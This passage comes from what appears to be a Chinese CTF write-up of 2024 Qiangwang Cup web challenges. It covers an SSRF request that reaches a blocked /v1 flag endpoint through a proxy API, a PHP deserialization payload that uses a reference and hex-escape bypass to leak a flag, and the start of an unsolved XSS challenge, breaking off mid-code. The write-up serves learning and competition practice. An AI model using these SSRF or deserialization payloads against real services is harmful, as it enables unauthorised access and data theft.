<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>proxy.conf</p>
<pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token directive"><span class="token keyword">server</span></span> <span class="token punctuation">&#123;</span>
    <span class="token directive"><span class="token keyword">listen</span> <span class="token number">8000</span></span><span class="token punctuation">;</span>

    <span class="token directive"><span class="token keyword">location</span> ~ /v1</span> <span class="token punctuation">&#123;</span>
        <span class="token directive"><span class="token keyword">return</span> <span class="token number">403</span></span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token directive"><span class="token keyword">location</span> ~ /v2</span> <span class="token punctuation">&#123;</span>
        <span class="token directive"><span class="token keyword">proxy_pass</span> http://localhost:8769</span><span class="token punctuation">;</span>
        <span class="token directive"><span class="token keyword">proxy_http_version</span> 1.1</span><span class="token punctuation">;</span>
        <span class="token directive"><span class="token keyword">proxy_set_header</span> Host <span class="token variable">$host</span></span><span class="token punctuation">;</span>
        <span class="token directive"><span class="token keyword">proxy_set_header</span> X-Real-IP <span class="token variable">$remote_addr</span></span><span class="token punctuation">;</span>
        <span class="token directive"><span class="token keyword">proxy_set_header</span> Upgrade <span class="token variable">$http_upgrade</span></span><span class="token punctuation">;</span>
        <span class="token directive"><span class="token keyword">proxy_set_header</span> Connection <span class="token variable">$connection_upgrade</span></span><span class="token punctuation">;</span>
        <span class="token directive"><span class="token keyword">proxy_set_header</span> X-Forwarded-For <span class="token variable">$proxy_add_x_forwarded_for</span></span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>以 v1 开头请求会返回403，以 <code>/v2</code> 开头的请求会代理转发到 localhost:8769</p>
<p>那意思就是要我们通过代理访问 v1</p>
<p>构造请求访问</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/v2/api/proxy</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">39.107.90.219:36870</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/json</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">109</span></span>
<span class="token application-json">
<span class="token punctuation">&#123;</span><span class="token property">"url"</span><span class="token operator">:</span><span class="token string">"http://127.0.0.1:8769/v1/api/flag"</span><span class="token punctuation">,</span>
<span class="token property">"method"</span><span class="token operator">:</span><span class="token string">"POST"</span><span class="token punctuation">,</span>
<span class="token property">"body"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span>
<span class="token property">"headers"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
<span class="token property">"follow_redirects"</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/11/02/%E5%BC%BA%E7%BD%91%E6%9D%AFS8/image-20241103141720027.png" alt="image-20241103141720027"></p>
<hr>
<h1 id="Password-Game"><a href="#Password-Game" class="headerlink" title="Password Game"></a>Password Game</h1><p>只有3秒时间反应，不然会被重定向会index.php</p>
<p>直接抓包开测</p>
<p>Rule 1: 请至少包含数字和大小写字母</p>
<p>Rule 2: 密码中所有数字之和必须为9的倍数</p>
<p>Rule 3: 请密码中包含下列算式的解(如有除法，则为整除): 14904 + 25</p>
<p>Rule 4: 密码长度不能超过170</p>
<p>rule2 和 rule3 会变，重新登录可以roll这些rule，roll个倍数低的比较容易配</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/game.php</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">eci-2zeg97hlr4shqg4ot30a.cloudeci1.ichunqiu.com</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">25</span></span>
<span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://eci-2zeg97hlr4shqg4ot30a.cloudeci1.ichunqiu.com</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://eci-2zeg97hlr4shqg4ot30a.cloudeci1.ichunqiu.com/game.php</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">Hm_lvt_2d0601bd28de7d49818249cf35d95943=1722006294,1723623724,1723858266; PHPSESSID=ubo7v7c3m3dn091u6pmida52n8</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>

password=qwe14929A2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>拿到源码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"2024qwb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"nonono"</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">guest</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">==</span><span class="token string double-quoted-string">"guest"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">root</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">value</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"2024qwb"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">value</span> <span class="token operator">=</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hello:"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">user</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">-></span><span class="token function">guess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hello"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$user</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$user</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"2024qwb"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hello!"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>链子很简单，但是绕过限制就要考虑的多了，然后仔细一看发现怎么guest类里是<code>$value()</code>不是<code>this-&gt;$value()</code>，那链子断了啊</p>
<p>而且 __get() 找一圈下来发现链子进不去</p>
<blockquote>
<p>题目提示：正确的解不会经过错误的代码，请观察一下是否能篡改可以输出的地方。</p>
</blockquote>
<p>发现直接<code>$a=new root();$a-&gt;test=&quot;&quot;;</code>就可以触发 __get </p>
<p>那么可以利用引用把 root 的 value 赋值给 user 的 username</p>
<p>payload：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">guest</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">root</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token operator">=</span><span class="token string double-quoted-string">"2024qwb"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">user</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token operator">=</span><span class="token string double-quoted-string">"qwe1077050A6"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">root</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">test</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">test</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">value</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// O:4:"root":3:&#123;s:8:"username";N;s:5:"value";s:7:"2024qwb";s:4:"test";O:4:"user":3:&#123;s:8:"username";R:3;s:8:"password";N;s:5:"value";s:12:"qwe1077050A6";&#125;&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后把 2024qwb 那段用十六进制绕过：<code>S:7:&quot;2024q\77b&quot;</code></p>
<p><img src="/blog/2024/11/02/%E5%BC%BA%E7%BD%91%E6%9D%AFS8/image-20241103131809125.png" alt="image-20241103131809125"></p>
<hr>
<h1 id="EzCalc（Unsolved）"><a href="#EzCalc（Unsolved）" class="headerlink" title="EzCalc（Unsolved）"></a>EzCalc（Unsolved）</h1><p>一眼xss</p>
<p>先看一下flag的位置，在bot.ts</p>
<pre class="line-numbers language-tsx" data-language="tsx"><code class="language-tsx"><span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> span <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.ant-alert-message'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>span<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> span<span class="token punctuation">.</span>textContent <span class="token operator">===</span> <span class="token string">'114514'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">https://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">APP_HOST</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> waitUntil<span class="token operator">:</span> <span class="token string">'networkidle2'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">focus</span><span class="token punctuation">(</span><span class="token string">'input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">await</span> page<span class="token punctuation">.</span>keyboard<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">"</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'/bot/flag'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> delay<span class="token operator">:</span> <span class="token number">100</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token string">'button'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>bot 会找类名为 .ant-alert-message 的元素，然后重启一个页面，往输入框里面填 flag 并提交</p>
<p>接下来我们找一下 bot 交互的地方</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go">r<span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">"/api/report"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> req ReportRequest
    <span class="token keyword">if</span> err <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">BindJSON</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusBadRequest<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"error"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Invalid request"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    <span class="token punctuation">&#125;</span>

    report <span class="token operator">:=</span> Report<span class="token punctuation">&#123;</span>
        ID<span class="token punctuation">:</span>          uuid<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        Expression<span class="token punctuation">:</span>  req<span class="token punctuation">.</span>Expression<span class="token punctuation">,</span>
        Result<span class="token punctuation">:</span>      req<span class="token punctuation">.</span>Result<span class="token punctuation">,</span>
        Email<span class="token punctuation">:</span>       req<span class="token punctuation">.</span>Email<span class="token punctuation">,</span>
        Comment<span class="token punctuation">:</span>     req<span class="token punctuation">.</span>Comment<span class="token punctuation">,</span>
        CheckResult<span class="token punctuation">:</span> <span class="token string">"waiting"</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> id <span class="token operator">:=</span> <span class="token keyword">range</span> req<span class="token punctuation">.</span>Screenshots <span class="token punctuation">&#123;</span>
        <span class="token keyword">var</span> screenshot Screenshot
        <span class="token keyword">if</span> err <span class="token operator">:=</span> db<span class="token punctuation">.</span><span class="token function">Where</span><span class="token punctuation">(</span><span class="token string">"id = ?"</span><span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">First</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>screenshot<span class="token punctuation">)</span><span class="token punctuation">.</span>Error<span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
            c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusBadRequest<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"error"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Screenshot not found"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> screenshot<span class="token punctuation">.</span>ReportID <span class="token operator">!=</span> <span class="token string">""</span> <span class="token punctuation">&#123;</span>
            c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusBadRequest<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"error"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Screenshot already associated with a report"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span>
        <span class="token punctuation">&#125;</span>

        screenshot<span class="token punctuation">.</span>ReportID <span class="token operator">=</span> report<span class="token punctuation">.</span>ID
        <span class="token keyword">if</span> err <span class="token operator">:=</span> db<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>screenshot<span class="token punctuation">)</span><span class="token punctuation">.</span>Error<span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
            c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"error"</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Internal Server Error"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> err <span class="token operator">:=</span> db<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>report<span class="token punctuation">)</span><span class="token punctuation">.</span>Error<span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
